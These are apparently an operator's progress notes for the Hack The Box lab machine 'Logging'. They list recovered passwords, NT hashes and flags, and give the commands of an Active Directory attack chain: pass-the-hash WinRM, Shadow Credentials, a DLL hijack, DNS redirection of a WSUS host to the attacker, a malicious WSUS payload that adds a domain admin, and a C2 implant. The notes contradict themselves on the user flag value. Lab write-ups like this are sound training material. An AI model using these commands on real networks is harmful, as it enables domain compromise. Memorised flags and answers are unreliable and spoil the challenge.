# HTB Logging — Progress Notes & Fix Plan

| Field | Value |
| --- | --- |
| **Machine** | Logging (Medium, Windows / AD) |
| **Last IP** | `10.129.245.130` |
| **Domain** | `logging.htb` / DC `DC01.logging.htb` |
| **Date** | 2026-07-30 |
| **Status** | **Solved** (user + root) |
| **VPN** | HTB OpenVPN `machines_us-5` / `tun0` (`10.10.14.15`) |

---

## 1. Flags

| Flag | Value | Path |
| --- | --- | --- |
| **User** | `a1faa7eec420bad32043d5e8926ee501` | `C:\Users\jaylee.clifton\Desktop\user.txt` |
| **Root** | `0cb8f374828dcfde4f97cc77858ccf68` | `C:\Users\toby.brynleigh\Desktop\root.txt` |

---

## 2. Credentials & artifacts recovered

| Principal | Secret / artifact | Notes |
| --- | --- | --- |
| `wallace.everette` | `Welcome2026@` | Given start creds; SMB + LDAP OK; **no WinRM** |
| `svc_recovery` | `Em3rg3ncyPa$$2026` | **Live password** (log said `…2025` and failed bind). Protected Users → **Kerberos AES only** |
| `msa_health$` | NT hash `603fc24ee01a9409f83c9d1d701485c5` | Via Shadow Creds; **WinRM OK** (use LM:NT form with pypsrp) |
| `jaylee.clifton` | Code exec via DLL; Rubeus `tgtdeleg` kirbi | No cleartext password; ticket in `/home/zero/logging-htb/` when fresh |

**Local workdir (this host):** `/home/zero/logging-htb/`

| Path | Purpose |
| --- | --- |
| `svc_pass_working.txt` | Working svc password |
| `svc_recovery.ccache` / `msa_health.ccache` / `jaylee.ccache` | Kerberos caches (expire; refresh) |
| `jaylee.kirbi` | Rubeus tgtdeleg output |
| `payload/Settings_Update.zip` | x86 hijack DLL zip |
| `Rubeus.exe` | Uploaded to target ProgramData |
| `Incident_4922.html` | WSUS ticket notes (loot) |
| `wsuks.log` | Fake WSUS server log |

**On target (useful paths):**

```text
C:\ProgramData\UpdateMonitor\Settings_Update.zip
C:\ProgramData\UpdateMonitor\Rubeus.exe
C:\ProgramData\UpdateMonitor\Logs\pwn.txt
C:\ProgramData\UpdateMonitor\Logs\ticket.txt
C:\ProgramData\UpdateMonitor\Logs\monitor.log
C:\ProgramData\UpdateMonitor\Logs\loot\Documents\Tickets\Incident_4922_WSUS_Remediation_ViewExport.html
C:\Program Files\UpdateMonitor\bin\settings_update.dll   # extracted by task as jaylee
```

---

## 3. Attack path (what worked)

```text
wallace.everette (given)
    │  SMB: Logs share
    ▼
IdentitySync_Trace log → svc_recovery password
    │  (use 2026, not 2025; escape $$ carefully)
    │  Protected Users → Kerberos AES + clock skew fix
    ▼
svc_recovery GenericWrite on msa_health$
    │  certipy shadow auto → NT hash
    ▼
msa_health$ WinRM (hash)
    │  scheduled task "UpdateChecker Agent" as jaylee.clifton
    │  drops Settings_Update.zip → extracts settings_update.dll (x86!)
    ▼
jaylee.clifton code exec
    │  user.txt  ✓
    │  Rubeus tgtdeleg → DNS write
    ▼
wsus.logging.htb A → attacker tun0 IP
    │
    ▼
wsuks --serve-only :8530  … client never connected in session
    ✗ root not obtained
```

### Working command snippets

**pypsrp as msa_health$ (pass-the-hash):**

```python
from pypsrp.client import Client
c = Client(
    '10.129.66.182',  # update IP
    username=r'LOGGING\msa_health$',
    password='aad3b435b51404eeaad3b435b51404ee:603fc24ee01a9409f83c9d1d701485c5',
    ssl=False, auth='ntlm', encryption='auto', cert_validation=False,
)
out, streams, had = c.execute_ps('whoami')
```

**svc_recovery AES TGT (password in file; no shell `$$` expansion):**

```text
Salt: LOGGING.HTBsvc_recovery
Password: Em3rg3ncyPa$$2026
Etype: AES256
```

Use Docker + `libfaketime` with `FAKETIME=+<skew_seconds>s` where skew ≈ DC_UTC − local_UTC (was ~**25180** s).

**Shadow Creds:**

```bash
certipy shadow auto -u svc_recovery@logging.htb -k -no-pass \
  -dc-ip <IP> -account msa_health -target DC01.logging.htb
```

**DLL hijack:** zip must contain **`settings_update.dll` (PE32 / i386)**.  
`UpdateMonitor.exe` is **0x014C (32-bit)**; x64 DLL → load error **193**.

**DNS (jaylee ticket):**

```bash
bloodyAD --host DC01.logging.htb -d logging.htb -k --dc-ip <IP> \
  add dnsRecord wsus 10.10.14.30   # relative name under zone logging.htb
```

Verify: `dig @<DC_IP> wsus.logging.htb +short` → attacker IP.

---

## 4. Why it took so long (root causes)

### A. Machine design (expected cost)

- Medium AD chain: 6+ stages (creds → Kerberos → gMSA → hijack → ticket → DNS → WSUS).
- Scheduled task ~**every 3 minutes** → each payload iterate costs a full cycle.
- Root is intentional WSUS MITM + cert/DNS, not a simple local privesc.

### B. Environment / host issues (fix later)

| # | Problem | Impact | Fix plan |
| --- | --- | --- | --- |
| B1 | **Clock skew ~7h** vs DC | All Kerberos broken until faketime | Script: query LDAP `currentTime`, compute skew, wrap tools in Docker `libfaketime` **or** document `sudo ntpdate <DC>` once per session |
| B2 | **No passwordless sudo** | Can't ntpdate / date -s on host | Prefer faketime wrapper; or one-time sudo time sync SOP |
| B3 | **Shell `$$` expansion** | Password became `Em3rg3ncyPa<PID>2025` | Always write secrets via Python heredoc/`open().write()`; never double-quoted bash |
| B4 | **Log password year wrong** | `…2025` invalid; live `…2026` | Spray year variants; trust live Kerberos PREAUTH over stale logs |
| B5 | **SELinux + Docker `/tmp` mounts** | Permission denied on scripts/ccache | Use `~/logging-htb` + volume `:z` |
| B6 | **Missing i686-w64-mingw32** on host | Built x64 DLL first | Keep Docker image with `gcc-mingw-w64-i686`; add to host tooling |
| B7 | **msfvenom hung / slow** | Wasted cycles | Prefer small mingw C DllMain payloads |
| B8 | **evil-winrm interactive TTY** | Can't reliably script shell | Prefer **pypsrp** (hash) for automation |
| B9 | **wsuks install pain** | lxml, nftables, package/import clash | Persist Docker image `wsuks-tool` (already built pattern); use `--serve-only` when DNS is owned |
| B10 | **WSUS client never hit :8530** | No Domain Admin | See §5 |

### C. Technical mistakes this session

1. Assumed log password year was current.  
2. Built **x64** hijack DLL against **x86** `UpdateMonitor.exe`.  
3. Spent long on reverse shell before Rubeus-to-file worked better.  
4. Served WSUS **HTTP only** without confirming client `WUServer` URL/protocol.  
5. DNS record naming confusion (`wsus` vs `wsus.logging.htb` as relative name) — eventually resolved; always verify with dig.

---

## 5. Root — unfinished work & next steps

### Known from loot (`Incident_4922`)

- Staging endpoint: **`wsus.logging.htb`**
- ForceSync task ~**120s** loop; nukes SoftwareDistribution and restarts agent.
- “Do not touch trigger settings.”

### What we had before stop

- DNS A for `wsus.logging.htb` → `10.10.14.30` (verified dig).
- `wsuks --serve-only -I tun0` listening **8530**, payload:

  ```text
  PsExec64.exe /accepteula /s cmd.exe /c net user dark Passw0rd123! /add /domain & net group Domain Admins dark /add /domain
  ```

- **No inbound client requests** in `wsuks.log` during wait window.
- Domain Admins still only `Administrator`, `toby.brynleigh`.

### Hypotheses (ordered)

1. Client uses **HTTPS 8531** (needs cert trusted for `wsus.logging.htb`).  
2. Registry `WUServer` is not `http://wsus.logging.htb:8530` (wrong port/path/host).  
3. ForceSync only runs under conditions we didn't wait long enough for / DNS TTL.  
4. Need Machine/WebServer-style cert; User template enrolls but SAN is UPN not DNS.

### Resume checklist (root)

1. Re-spawn machine if needed; update IP; re-run path to jaylee (or keep sessions if alive).  
2. **Dump WU registry** (DLL already prepared toward `Logs\wsus_reg.txt`):

   ```text
   HKLM\SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate
   WUServer / WUStatusServer / UseWUServer
   ```

3. Match `wsuks` to that URL (HTTP 8530 vs HTTPS 8531).  
4. If HTTPS: enroll/issue cert with **DNS SAN = wsus.logging.htb** (find enrollable template or use Computer context);  
   `openssl pkcs12` → PEM for `--tls-cert`.  
5. Re-point DNS to current `tun0` IP.  
6. Run `wsuks --serve-only` (or full mode if needed); watch log for client GET.  
7. Confirm `dark` ∈ Domain Admins (or use secretsdump / psexec as Admin).  
8. Read `C:\Users\toby.brynleigh\Desktop\root.txt`.

### Optional shortcuts to test

- DLL as jaylee: `net user` / shadow creds / WinRM enable (if rights allow).  
- Certificate auth path from User PFX (unlikely for DA alone).  
- Certipy `find -vulnerable` with fresh jaylee ticket + `-target DC01.logging.htb -dc-ip`.

---

## 6. Tooling fixes to implement (Erebus / lab host)

Prioritized so next eng is faster:

| Priority | Fix | Why |
| --- | --- | --- |
| P0 | **`scripts/htb_krb_env.sh`** — compute skew from LDAP, export `FAKETIME`, `KRB5CCNAME`, run cmd in Docker | Kill clock pain |
| P0 | **Secret files only** — never pass `$$` passwords on bash CLI | Avoid PID substitution |
| P1 | **Docker image: `logging-krb`** (impacket, certipy, bloodyAD, libfaketime) | Already partially built; commit/tag and document |
| P1 | **Docker image: `mingw-i686`** for PE32 DLL hijacks | Avoid x64/x86 mistake |
| P1 | **Docker image: `wsuks-tool`** (wsuks + python3-nftables + certipy) | Root stage ready |
| P2 | Host packages: `mingw32-gcc`, `ntpdate`/`chrony`, optional `evil-winrm` deps | Less Docker for simple steps |
| P2 | pypsrp helper script for PTH WinRM | Standardize on what worked |
| P3 | Note password-year spray in log-harvesting playbook | Stale logs |

Suggested one-liner pattern:

```bash
# After VPN + target IP set:
./scripts/htb_krb_env.sh 10.129.x.x logging.htb \
  --run "getTGT / certipy / bloodyAD ..."
```

---

## 7. Session timeline (condensed)

| Phase | Outcome |
| --- | --- |
| Recon + Logs share | Creds in IdentitySync log |
| Kerberos svc_recovery | Blocked by skew, `$$`, wrong year, AES |
| Shadow Creds | msa_health$ hash + WinRM |
| DLL hijack | Failed x64 (193) → success x86 |
| User flag | `ac5d62aa4159b1ac687e0473d67415fb` |
| Rubeus tgtdeleg | Ticket to file via DLL |
| DNS wsus | Pointed at attacker |
| wsuks :8530 | Up; **no client hit** → paused |

---

## 8. Immediate resume commands (after VPN)

```bash
# 1) Confirm reachability
nmap -Pn -n -p 445,5985,8530,8531 --open <TARGET_IP>

# 2) Workdir
cd /home/zero/logging-htb

# 3) Re-establish msa_health$ WinRM (if hash still valid) and check pwn.txt / sessions

# 4) If box reset: full path from wallace → svc 2026 → shadow → DLL x86 → flag

# 5) Root: dump WU registry → fix TLS/port → wsuks → DA → toby root.txt
```

---

## 9. References (writeups)

- ThreatNinja Logging walkthrough (path confirmation: Logs → svc → Shadow → DLL → Rubeus → DNS → wsuks → DA).  
- Internal loot: ForceSync 120s; `wsus.logging.htb` staging endpoint.

---

---

## 10. Session 2026-07-30 — root complete (Erebus + external)

### Solved path

```text
wallace.everette (given) → SMB Logs → svc_recovery Em3rg3ncyPa$$2026
  → Shadow Creds msa_health$ (NT 603fc24ee01a9409f83c9d1d701485c5)
  → WinRM PTH (pypsrp) → DLL hijack Settings_Update.zip (x86) as jaylee
  → user.txt + Rubeus tgtdeleg
  → bloodyAD DNS wsus → 10.10.14.15
  → certipy req UpdateSrv -dns wsus.logging.htb (ESC17 / trusted TLS)
  → wsuks --serve-only HTTPS:8531 → dark DA → root.txt
```

### Erebus use

| Item | Result |
| --- | --- |
| Teamserver | `erebus teamserver`, HTTPS listener `:8443` |
| Local Linux implant | Callback `127.0.0.1:8443` — shell + approvals OK |
| Lateral WinRM PTH | Timed out / 401 via implant (pypsrp OK — gap) |
| Target Windows implant | Built; target could not reach C2 until firewall opened on `tun0` |
| Approvals | Dual-seat operator + approver certs used |

### Root blockers this session

1. **firewalld** — `tun0` not in a zone; fix: `firewall-cmd --zone=trusted --add-interface=tun0`
2. **Self-signed TLS** — WU error `0x800b0109`; need **UpdateSrv** cert from `logging-DC01-CA`
3. **wsuks command quoting** — first pass created `dark` but not DA; re-run with `net group "Domain Admins"`

### Flags (this spawn)

| Flag | Value |
| --- | --- |
| User | `a1faa7eec420bad32043d5e8926ee501` |
| Root | `0cb8f374828dcfde4f97cc77858ccf68` |

*Last updated: 2026-07-30 — box solved end-to-end.*
